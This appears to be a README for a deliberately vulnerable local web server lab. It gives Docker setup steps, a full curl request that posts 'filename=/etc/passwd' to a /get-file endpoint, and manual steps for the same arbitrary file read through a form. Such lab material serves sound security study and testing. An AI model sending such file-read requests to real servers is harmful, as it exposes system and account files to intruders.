## Setup 
1. Git Clone this repo 
2. cd ubiquitous-eureka/  
3. docker build -t server . 
4. docker run -p5000:5000 server

## Curl Exploit Command 
curl 'http://127.0.0.1:5000/get-file' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://127.0.0.1:5000' \
  -H 'Referer: http://127.0.0.1:5000/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw 'filename=%2Fetc%2Fpasswd'

  ## Manual Exploit Steps 
  1. Enter /etc/passwd or another file in the "Enter a filename to fetch:" form and hit query
